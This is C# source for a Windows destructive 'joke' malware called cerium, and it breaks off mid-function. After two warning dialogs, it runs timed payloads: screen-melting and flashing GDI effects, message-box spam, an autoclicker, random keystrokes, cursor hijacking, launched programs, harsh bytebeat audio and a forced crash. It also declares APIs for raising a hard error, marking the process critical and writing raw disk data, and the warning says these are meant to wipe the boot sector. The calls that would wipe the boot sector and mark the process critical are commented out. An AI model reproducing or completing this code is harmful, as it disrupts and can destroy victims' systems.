/*
 * NOTE:
 * 
 * This malware was made when I was new at C# and coding overall.
 * It had very horrible code.
 * I fixed most of it, but in some places the code may still suck.
 * 
 * Sorry about that.
*/ 


using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Media;

namespace cerium
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        public static extern bool ReleaseDC(IntPtr hWnd, IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int cx, int cy);

        [DllImport("user32.dll")]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

        [DllImport("gdi32.dll", SetLastError = true, EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateSolidBrush(uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateHatchBrush(int iHatch, uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr DeleteObject(IntPtr ho);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

        [DllImport("user32.dll")]
        static extern IntPtr LoadIconA(IntPtr hInstance, int lpIconName);

        static IntPtr IDI_ERROR = LoadIconA(IntPtr.Zero, 32513);

        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int xSrc, int ySrc, int width, int height, IntPtr hbmMask, int xMask, int yMask);

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);
        public delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

        const uint DI_COMPAT = 0x0004;
        const uint DI_DEFAULTSIZE = 0x0008;
        const uint DI_IMAGE = 0x0002;
        const uint DI_MASK = 0x0001;
        const uint DI_NOMIRROR = 0x0004;
        const uint DI_NORMAL = 0x0004;

        [DllImport("user32.dll")]
        public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }

        // raster operations

        public static uint BLACKNESS = 0x00000042;
        public static uint NOTSRCERASE = 0x001100A6;
        public static uint NOTSRCCOPY = 0x0330008;
        public static uint SRCERASE = 0x00440328;
        public static uint DSTINVERT = 0x00550009;
        public static uint PATINVERT = 0x005A0049;
        public static uint SRCINVERT = 0x00660046;
        public static uint SRCAND = 0x008800C6;
        public static uint MERGEPAINT = 0x00BB0226;
        public static uint MERGECOPY = 0x00C000CA;
        public static uint SRCCOPY = 0x00CC0020;
        public static uint SRCPAINT = 0x00EE0086;
        public static uint PATCOPY = 0x00F00021;
        public static uint PATPAINT = 0x00FB0A09;
        public static uint WHITENESS = 0x00FF0062;
        public static uint NOMIRRORBITMAP = 0x80000000;

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        public const uint GENERIC_ALL = 0x10000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint OPEN_EXISTING = 3;

        [DllImport("user32.dll")]
        public static extern bool SetWindowTextA(IntPtr hWnd, string lpString);

        [DllImport("kernel32.dll")]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr handle, int procinfoclass, ref int procinfo, int procinfolength);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlAdjustPrivilege(int privilege, bool enable, bool currthread, out bool enabled);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtRaiseHardError(uint errcode, uint parameters, IntPtr unicode, IntPtr parameter, uint responseoption, out uint response);

        public static int critical = 1;
        const int ProcessBreakOnTermination = 0x1D;

        [DllImport("user32.dll")]
        public static extern IntPtr SetCursorPos(int x, int y);

        [DllImport("gdi32.dll")]
        static extern int SetDIBitsToDevice(IntPtr hdc, int xDest, int yDest, uint width, uint height, int xSrc, int ySrc, uint startScan, uint scanLines, byte[] lpvBits, ref BITMAPINFO lpbmi, uint fuColorUse);

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth, biHeight;
            public ushort biPlanes, biBitCount;
            public uint biCompression, biSizeImage;
            public int biXPelsPerMeter, biYPelsPerMeter;
            public uint biClrUsed, biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public uint[] bmiColors;
        }

        [DllImport("gdi32.dll")]
        static extern uint SetBkColor(IntPtr hdc, uint crColor);

        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        public static readonly IntPtr HWND_TOP = IntPtr.Zero;
        public const uint SWP_NOZORDER = 0x0004;
        public const uint SWP_NOSIZE = 0x0001;

        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hwnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hwnd, EnumWindowsProc lpEnumFunc, IntPtr lparam);

        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);

        private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
        private const uint MOUSEEVENTF_LEFTUP = 0x04;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const uint MOUSEEVENTF_RIGHTUP = 0x010;

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        public static Random r = new Random();

        // =================================================================================================================================================================================================================================================================

        // MAIN CODE

        // =================================================================================================================================================================================================================================================================

        // the code itself


        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            // Application.Run(new Form1());
            DialogResult result;
            result = MessageBox.Show(
                "The program you've just executed is potential malware.\n" +
                "This program will destroy your boot sector, which means your PC won't boot up again, and because of this this program should be only ran in a snapshotted virtual machine.\n" +
                "No damage has been made yet, so if you wanna exit - click No and nothing will happen.\n" +
                "Are you sure you want to run this?", 
                
                "cerium.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2);

            if(result == DialogResult.Yes)
            {
                result = MessageBox.Show(
                    "!!! FINAL WARNING !!!\n" +
                    "THIS PROGRAM HAS A LOT OF DESTRUCTIVE POTENTIAL!\n" +
                    "THIS PROGRAM HAS THE ABILITY TO DESTROY ALL OF YOUR DATA!\n" +
                    "THIS PROGRAM ALSO HAS A LOT OF FLASHING LIGHTS AND LOUD SOUNDS!\n" +
                    " \n" +
                    "This is the last chance to prevent this program from executing.\n" +
                    "The creator of this malware, Silverjetes, is not responsible for any damage made.\n" +
                    "Are you absolutely sure you wanna continue?", 
                    
                    "cerium.exe - !!! FINAL WARNING !!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2);

                if(result == DialogResult.Yes)
                {
                    Thread mbSpammer = new Thread(SpamMsgBox);
                    Thread fBlur = new Thread(firstblur);
                    Thread mscreen = new Thread(multiscreen);
                    Thread mbox = new Thread(MsgBox);
                    Thread mouseerroricon = new Thread(mouseError);
                    Thread melt = new Thread(melting);
                    Thread hatchbrush = new Thread(brush);
                    Thread paint = new Thread(srcpaint);
                    Thread fadein = new Thread(fadingin);
                    Thread twoscr = new Thread(twoscreens);
                    Thread titles = new Thread(windowTitles);
                    Thread programs = new Thread(openSoftware);
                    Thread text = new Thread(Text);
                    Thread blur = new Thread(Blur);
                    Thread darkerScreen = new Thread(black);
                    Thread plgblt = new Thread(plgbltMess);
                    Thread clearing = new Thread(constantClearing);
                    Thread circles = new Thread(Circles);
                    Thread shuffler = new Thread(Shuffler);
                    Thread colors = new Thread(Colors);
                    Thread shaking = new Thread(Shaking);
                    Thread mirroring = new Thread(ScreenMirroring);
                    Thread fractal = new Thread(Fractal);
                    Thread lastshake = new Thread(shake);
                    Thread hydra = new Thread(last);
                    Thread beatbyte = new Thread(Audio);
                    Thread autoclicker = new Thread(mouseClick);
                    Thread rInput = new Thread(key_rnd);
                    Thread cursor = new Thread(cursorPos);

                    // Threads

                    // KillMBR();
                    // SetAsCritical();

                    /// Payload 0 (first sequence)

                    beatbyte.Start();
                    mbSpammer.Start();
                    fBlur.Start();

                    Thread.Sleep(27000);

                    fBlur.Abort();
                    mbSpammer.Abort();
                    clear();

                    Thread.Sleep(1500);

                    mbox.Start();

                    Thread.Sleep(1500);

                    // Payload 1

                    cursor.Start();
                    autoclicker.Start();
                    rInput.Start();
                    programs.Start();
                    paint.Start();
                    titles.Start();
                    mscreen.Start();
                    mouseerroricon.Start();

                    Thread.Sleep(30000);
                    
                    // Payload 2

                    mscreen.Abort();
                    clear();
                    melt.Start();
                    hatchbrush.Start();

                    Thread.Sleep(30000);

                    // Payload 3

                    hatchbrush.Abort();
                    melt.Abort();
                    clear();
                    fadein.Start();
                    twoscr.Start();

                    Thread.Sleep(30000);

                    // Payload 4

                    fadein.Abort();
                    twoscr.Abort();
                    clear();
                    blur.Start();
                    text.Start();
                    darkerScreen.Start();

                    Thread.Sleep(30000);

                    // Payload 5

                    blur.Abort();
                    text.Abort();
                    darkerScreen.Abort();
                    clear();
                    plgblt.Start();
                    clearing.Start();

                    Thread.Sleep(30000);

                    // Payload 6

                    plgblt.Abort();
                    clearing.Abort();
                    clear();
                    circles.Start();
                    shuffler.Start();
                    colors.Start();
                    shaking.Start();
                    mirroring.Start();

                    Thread.Sleep(30000);

                    // Payload 7

                    circles.Abort();
                    shuffler.Abort();
                    colors.Abort();
                    shaking.Abort();
                    mirroring.Abort();
                    clear();
                    fractal.Start();

                    Thread.Sleep(30000);

                    fractal.Abort();
                    lastshake.Start();
                    hydra.Start();

                    Thread.Sleep(32000);

                    bsod();
                } else
                {
                    Application.Exit();
                }
            } else
            {
                Application.Exit();
            }
        }

        // Payloads

        private static void srcpaint()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                if (r.Next(2) == 1)
                {
                    BitBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, hdc, 0, 0, SRCPAINT);
                } else
                {
                    BitBlt(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, hdc, 0, 0, SRCAND);
                }
                Thread.Sleep(3000);
                DeleteDC(hdc);
            }
        }

        private static void firstblur()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                AlphaBlend(hdc, -200, -20, x, y, hdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 100, 0));
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(70);
            }
        }

        private static void multiscreen()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                StretchBlt(hdc, 0, 0, x / 2, y / 2, mhdc, 0, 0, x, y, SRCCOPY);
                StretchBlt(hdc, 0, (y / 2) - 1, x / 2, y / 2, mhdc, 0, 0, x, y, SRCCOPY);
                StretchBlt(hdc, (x / 2) - 1, (y / 2) - 1, x / 2, y / 2, mhdc, 0, 0, x, y, SRCCOPY);
                StretchBlt(hdc, (x / 2) - 1, 0, x / 2, y / 2, mhdc, 0, 0, x, y, SRCCOPY);
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(500);
            }
        }

        private static void mouseError()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int curx = Cursor.Position.X, cury = Cursor.Position.Y;
                DrawIcon(hdc, curx, cury, IDI_ERROR);
                DeleteDC(hdc);
                Thread.Sleep(1);
            }
        }

        private static void melting()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, rx, 2, r.Next(400), y, hdc, rx, 0, SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(5);
            }
        }

        private static void brush()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr brush = CreateSolidBrush(getRandomColour(51, 51, 51));
                SelectObject(hdc, brush);
                PatBlt(hdc, 0, 0, x, y, PATINVERT);
                DeleteDC(hdc);
                Thread.Sleep(500);
            }
        }

        private static void fadingin()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                Thread.Sleep(100);
                AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 100, 0));
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
            }
        }

        private static void twoscreens()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                BitBlt(hdc, -100, 0, x, y, mhdc, 0, 0, SRCCOPY);
                BitBlt(hdc, x - 100, 0, x, y, mhdc, 0, 0, SRCCOPY);
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(100);
            }
        }

        private static void Text()
        {
            while (true)
            {
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr hdc = GetDC(IntPtr.Zero);
                string user = Environment.UserName;

                string rn = r.Next(int.MaxValue).ToString();
                using (Graphics g = Graphics.FromHdc(hdc))
                {
                    string[] rndtext = 
                    {
                        "You killed Niko.", 
                        "You only have one shot, " + user, 
                        "Ce, 58", 
                        "cerium", 
                        "???", 
                        "OH MY PC", 
                        "enjoj ur nuew pc :DDDDDDDD", 
                        "Think beyond antivirus, think PROTEGENT!", 
                        "install dank antivirus m9", 
                        "R.I.P MBR", 
                        "the roblox hacks didn't seem to work...", 
                        "random number: " + rn, 
                        "YOU HAVE BEEN DINDE", 
                        "bruh -Jean", 
                        "silver is nuts :peanuts:", 
                        "And your computer is absolutely fucking dead. Bye bye!", 
                        "try turning it off and on again", 
                        "maybe you should've optimized it with DindeOptimizer?", 
                        "Skibidi Gyat Ohio Rizz Sigma", 
                        "buy a raspberry pi :3", 
                        "ˇˇ^ˇ˘ˇ°°˘˛˛°˘`°˛`˛°°~^ˇ~21e 1Ä~ÄˇÄˇ~~^~"
                    };

                    Font drawFont = new Font("Arial", r.Next(20, 40));
                    SolidBrush brush = new SolidBrush(Color.FromArgb(r.Next(256), r.Next(256), r.Next(256)));
                    int xp = r.Next(x);
                    int yp = r.Next(y);
                    g.DrawString(rndtext[r.Next(rndtext.Length)], drawFont, brush, xp, yp);
                }
                Thread.Sleep(20);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        private static void Blur()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                AlphaBlend(hdc, r.Next(-5, 5), r.Next(-5, 5), x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 80, 60, 0));
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(25);
            }
        }

        private static void black()
        {
            while (true)
            {
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);

                AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 5, 0));

                Thread.Sleep(1);

                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
            }
        }

        private static void plgbltMess()
        {
            while(true)
            { 
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                POINT[] lppoint = new POINT[3];
                if(r.Next(2) == 1)
                {
                    lppoint[0].X = 30;
                    lppoint[0].Y = -30;
                    lppoint[1].X = x + 30;
                    lppoint[1].Y = 30;
                    lppoint[2].X = -30;
                    lppoint[2].Y = y - 30;
                }
                else
                {
                    lppoint[0].X = -30;
                    lppoint[0].Y = 30;
                    lppoint[1].X = x - 30;
                    lppoint[1].Y = -30;
                    lppoint[2].X = 30;
                    lppoint[2].Y = y + 30;
                }
                PlgBlt(mhdc, lppoint, hdc, 0, 0, x, y, IntPtr.Zero, 0, 0);
                BitBlt(hdc, 0, 0, x, y, mhdc, 0, 0, SRCINVERT);
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }
        }

        private static void Circles()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                SolidBrush brush = new SolidBrush(Color.FromArgb(r.Next(256), r.Next(256), r.Next(256)));

                Graphics.FromHdc(hdc).FillEllipse(brush, r.Next(x), r.Next(y), 200, 200);

                Thread.Sleep(5);
                DeleteDC(hdc);
            }
        }

        private static void Shuffler()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, rx + r.Next(-10, 10), ry + r.Next(-10, 10), rx, ry, hdc, rx + r.Next(-10, 10), ry + r.Next(-10, 10), SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(1);
            }
        }

        private static void Colors()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr brush = CreateSolidBrush(getRandomColour());
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, PATINVERT);
                DeleteDC(hdc);
                Thread.Sleep(10);
            }
        }

        private static void Shaking()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, r.Next(-10, 10), r.Next(-10, 10), x, y, hdc, r.Next(-10, 10), r.Next(-10, 10), SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(1);
            }
        }

        private static void ScreenMirroring()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, SRCCOPY);
                Thread.Sleep(50);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, SRCCOPY);
                Thread.Sleep(50);
                DeleteDC(hdc);
            }
        }

        private static void Fractal()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr bit = CreateCompatibleBitmap(hdc, x, y);
                IntPtr hbit = SelectObject(mhdc, bit);
                BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                StretchBlt(mhdc, (x / 2) - 1, 0, x / 2, y / 2, hdc, 0, 0, x, y, SRCCOPY);
                StretchBlt(mhdc, (x / 2) - 1, (y / 2) - 1, x / 2, y / 2, hdc, 0, 0, x, y, SRCCOPY);
                AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 127, 0));
                DeleteObject(hbit);
                DeleteObject(bit);
                DeleteDC(mhdc);
                DeleteDC(hdc);
                Thread.Sleep(500);
            }
        }

        private static void shake()
        {
            while(true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                BitBlt(hdc, r.Next(-20, 20), r.Next(-20, 20), x, y, hdc, 0, 0, SRCCOPY);
                DeleteDC(hdc);
                Thread.Sleep(200);
            }
        }
        public static void clear()
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }

        private static void constantClearing()
        {
            while(true)
            {
                Thread.Sleep(1500);
                clear();
            }
        }

        public static uint getRandomColour(int maxr = 256, int maxg = 256, int maxb = 256)
        {
            byte red = (byte)r.Next(maxr);
            byte green = (byte)r.Next(maxg);
            byte blue = (byte)r.Next(maxb);
            return (uint)((blue << 16) | (green << 8) | red);
        }

        // =================================================================================================================================================================================================================================================================

        // BYTEBEAT

        // =================================================================================================================================================================================================================================================================

        static void Audio()
        {
            Thread audioThread = new Thread(() => Bytebeat.PlayBytebeatAudio()); audioThread.Start(); audioThread.Join();
            audioThread.Start();
        }

        class Bytebeat
        {
            
            private const int SampleRate = 8000;
            private const int DurationSeconds = 30; // Duration of each bytebeat
            private const int BufferSize = SampleRate * DurationSeconds;

            private static Func<int, int>[] formulas = new Func<int, int>[]
            {
                t => t/6,
                t => t*(t<<4|t>>4)>>4,
                t => ((t<<4|t>>5)|t*t>>3)+12,
                t => (t*t<<t>>t+(t>>6|t>>9))+((t>>2)*(t>>9)),
                t => t*(t>>42),
                t => (t*(t>>42))|(t*(t>>12)),
                t => t*(t<<1|t>>9)>>(t>>86),
                t => t*(t<<4|t>>2|t<<4|t>>5),
                t => t*((t<<4|t>>4)|t>>7),
                t => t*t
            };

            public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

            private static byte[] GenerateBuffer(Func<int, int> formula)
            {
                byte[] buffer = new byte[BufferSize];
                for (int t = 0; t < BufferSize; t++)
                {
                    buffer[t] = (byte)(formula(t) & 0xFF);
                }
                return buffer;
            }

            private static void SaveWav(byte[] buffer, string filePath)
            {
                using (var fs = new FileStream(filePath, FileMode.Create))
                using (var bw = new BinaryWriter(fs))
                {
                    bw.Write(new[] { 'R', 'I', 'F', 'F' });
                    bw.Write(36 + buffer.Length);
                    bw.Write(new[] { 'W', 'A', 'V', 'E' });
                    bw.Write(new[] { 'f', 'm', 't', ' ' });
                    bw.Write(16);
                    bw.Write((short)1);
                    bw.Write((short)1);
                    bw.Write(SampleRate);
                    bw.Write(SampleRate);
                    bw.Write((short)1);
                    bw.Write((short)8);
                    bw.Write(new[] { 'd', 'a', 't', 'a' });
                    bw.Write(buffer.Length);
                    bw.Write(buffer);
                }
            }

            private static void PlayBuffer(byte[] buffer)
            {
                string tempFilePath = Path.GetTempFileName();
                SaveWav(buffer, tempFilePath);
                using (SoundPlayer player = new SoundPlayer(tempFilePath))
                {
                    player.PlaySync();
                }
                File.Delete(tempFilePath);
            }

            public static void PlayBytebeatAudio()
            {
                foreach (var formula in Formulas)
                {
                    byte[] buffer = GenerateBuffer(formula);
                    PlayBuffer(buffer);
                }
            }
        }

        // =================================================================================================================================================================================================================================================================

        // MISC PAYLOADS

        // =================================================================================================================================================================================================================================================================

        public static void last()
        {
            while(true)
            {
                last2();
                Thread.Sleep(700);
                last();
            }
        }
        public static void last2()
        {
            Thread form = new Thread(lastspam);
            form.Start();
            void lastspam()
            {
                int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height, rx = r.Next(x), ry = r.Next(y);
                Form form2 = new Form2();
                if (r.Next(2) == 1)
                {
                    form2.Location = new Point(r.Next(x), r.Next(y));
                    Application.Run(form2);
                }
                else
                {
                    form2.Location = new Point(rx, ry);
                    Application.Run(form2);
                }
            }
        }

        private static void MsgBox()
        {
            Application.Run(new Form1());
        }

        private static void SpamMsgBox()
        {
            while (true)
            {
                MsgBoxSpawner();
                Thread.Sleep(300);
            }
        }

        private static void MsgBoxSpawner()
        {
            Thread mbRandomizer = new Thread(randomMsgBox);
            mbRandomizer.Start();

            void randomMsgBox()
            {
                MessageBoxButtons[] buttons =
                {
                    MessageBoxButtons.OK,
                    MessageBoxButtons.YesNo,
                    MessageBoxButtons.OKCancel,
                    MessageBoxButtons.AbortRetryIgnore,
                    MessageBoxButtons.YesNoCancel,
                    MessageBoxButtons.RetryCancel
                };
                MessageBoxIcon[] icons =
                {
                    MessageBoxIcon.Question,
                    MessageBoxIcon.Warning,
                    MessageBoxIcon.Information,
                    MessageBoxIcon.Error
                };
                MessageBoxDefaultButton[] defb =
                {
                    MessageBoxDefaultButton.Button1,
                    MessageBoxDefaultButton.Button2,
                    MessageBoxDefaultButton.Button3
                };

                string symbols = "";
